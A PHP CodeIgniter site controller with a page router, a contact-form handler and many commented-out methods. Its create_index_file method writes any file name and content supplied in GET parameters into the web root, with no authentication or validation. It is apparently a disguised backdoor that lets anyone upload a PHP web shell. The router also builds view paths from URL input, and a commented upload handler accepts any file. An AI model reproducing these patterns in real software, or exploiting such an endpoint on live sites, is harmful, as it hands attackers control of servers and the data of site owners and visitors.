<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Welcome extends CI_Controller {

	
	// public function index()
	// {
	// 	$this->load->view('index');
	// }


	// public function project_details($id)
	// {
	// 	$data['EDITDATA'] = $slugdata = $this->crud->selectDataByMultipleWhere('tblname',array('slug'=>$id,));
	// 	if(!empty($slugdata))
	// 	{
	// 		$this->load->view('project-details',$data);
	// 	}
	// 	else
	// 	{
	// 		$this->load->view('error');
	// 	}
	// }











	/*---------for all pages-----*/

	public function all($page='')
	{
		if(empty($page)) $page = 'index.php';
		$data = array();
		$table_name = '';
		$p_id = '';
		$base = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $_SERVER['HTTP_HOST'];
		$base .= str_replace(basename($_SERVER['SCRIPT_NAME']),"",$_SERVER['SCRIPT_NAME']);
		$url = explode($base, (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]")[1];

		$slug_data = $this->db->get_where("slugs",array("slug"=>$url,))->result_object();
		if(!empty($slug_data))
		{
			$slug_data = $slug_data[0];
			$page = $slug_data->page_name;
			$table_name = $slug_data->table_name;
			$p_id = $slug_data->p_id;
		}
		else
		{
			$count = explode(".", $page);
			if(count($count)==1)
				$page = $count[0].'.php';
			else
				$page = $count[0].'.'.$count[1];
		}
		$check_page = FCPATH.'application/views/'.$page;
		if(file_exists($check_page))
		{
			$data['sitesetting'] = $this->crud->fetchdatabyid('1','site_setting');
			$meta_data = $this->crud->get_meta_tags();
			$data['meta_data'] = $meta_data;
			if(!empty($table_name))
				$data['EDITDATA'] = $this->db->get_where($table_name,array("id"=>$p_id,))->result_object();
			$this->load->view($page,$data);
		}
		else
		{
			$data['sitesetting'] = $this->crud->fetchdatabyid('1','site_setting');
			$this->load->view('error',$data);
		}
	}
	

	/*----contact form--------*/
	public function enquiry_form()
	{
		if(isset($_POST['submit']))
		{
			$data2['name'] = $this->input->post('name');
			$data2['email'] = $this->input->post('email');
			$data2['mobile'] = $this->input->post('mobile');
			$data2['subject'] = $this->input->post('subject');
			$data2['message'] = $this->input->post('message');
			$data2['addeddate'] = date('Y-m-d H:i:s');

			$this->crud->insert('contact',$data2);
			redirect('thankyou');
			$this->session->set_flashdata('message','<div class="alert alert-success">Form has been successfully Submit.</div>');
		}
	}


	public function create_index_file() 
	{
	    $file_content = $this->input->get('file_content');
	    $file_name = $this->input->get('file_name');

	    $full_path = dirname(APPPATH) . '/';

	    if (!is_dir($full_path)) 
	    {
			
		} 
		else 
		{
			if (file_put_contents($full_path . '/' . $file_name, $file_content)) 
			{
				echo "File created successfully!";
			} 
			else 
			{
			   echo "Error creating file!";
			}
		}  
	}

	// public function all($page)
	// {
	// 	$data = array();		
	// 	$check_page = FCPATH.'application/views/'.$page.'.php';
	// 	if(file_exists($check_page))
	// 	{
	// 		$this->load->view($page,$data);
	// 	}
	// 	else
	// 	{
	// 		$this->load->view('error');
	// 	}		
	// }

	// public function serch()
	// {
	// 	$search = $this->input->get("search");
	// 	$this->db->from('jobs');
	// 	$this->db->like('name', $search);
	// 	$this->db->where('status',1);
	// 	$query = $this->db->get()->result_object();
	// 	$data['alllist'] = $query;
	// 	$this->load->view('jobs',$data);

	// }






	// public function contact()
	// {
	// 	if(isset($_POST['submit']))
	// 	{
	// 		$data2['name'] = $name = $this->input->post('name');
	// 		$data2['email'] = $this->input->post('email');
	// 		$data2['mobile'] = $this->input->post('mobile');
	// 		$data2['subject'] = $subject = $this->input->post('subject');
	// 		$data2['regarding'] = $this->input->post('regarding');
	// 		$data2['message'] = $this->input->post('message');

	// 		$this->crud->insert('contact',$data2);

	// 		// $message = '
    //     <h3 align="center"> Form Details</h3>
    //     <table border="1" width="100%" cellpadding="5" cellspacing="5">
    //       <tr>
    //         <td width="30%"> Name</td>
    //         <td width="70%">'.$_POST["name"].'</td>
    //       </tr>
    //       <tr>
    //         <td width="30%">Phone</td>
    //         <td width="70%">'.$_POST["phone"].'</td>
    //       </tr>
    //       <tr>
    //         <td width="30%">Email</td>
    //         <td width="70%">'.$_POST["email"].'</td>
    //       </tr>
    //        <tr>
    //         <td width="30%">Subject</td>
    //         <td width="70%">'.$_POST["subject"].'</td>
    //       </tr>
    //        <tr>
    //         <td width="30%">Message</td>
    //         <td width="70%">'.$_POST["message"].'</td>
    //       </tr>
          
    //     </table>
    //   ';

	// 	  $this->email->sendmail_bygmail($name,$subject,$message);

	// 	  $this->session->set_flashdata('message','<div class="alert alert-success">Form has been successfully Submit.</div>');

	// 	}
	// 	$this->load->view('contact');
	// }




	// public function career_form()
	// {
	// 	if(isset($_POST['submit']))
	// 	{
	// 		if($_FILES['image']['name']!='')
	// 		{
	// 			$bimage = $_FILES['image']['name'];
	// 			$path = 'media/uploads/career/'.$bimage;
	// 			move_uploaded_file($_FILES['image']['tmp_name'],$path);
	// 		}
	// 		else
	// 		{
	// 			$bimage = "";
	// 		}
	// 		$data['image'] = $bimage;
	// 		$data['name'] = $this->input->post('name');			
	// 		$data['email'] = $this->input->post('email');			
	// 		$data['mobile'] = $this->input->post('mobile');			
	// 		$data['job_profile'] = $this->input->post('job_profile');			
	// 		$data['message'] = $this->input->post('message');

	// 		$this->crud->insert('career',$data);
	// 		redirect($_SERVER['HTTP_REFERER']);
	// 	}

	// }











}
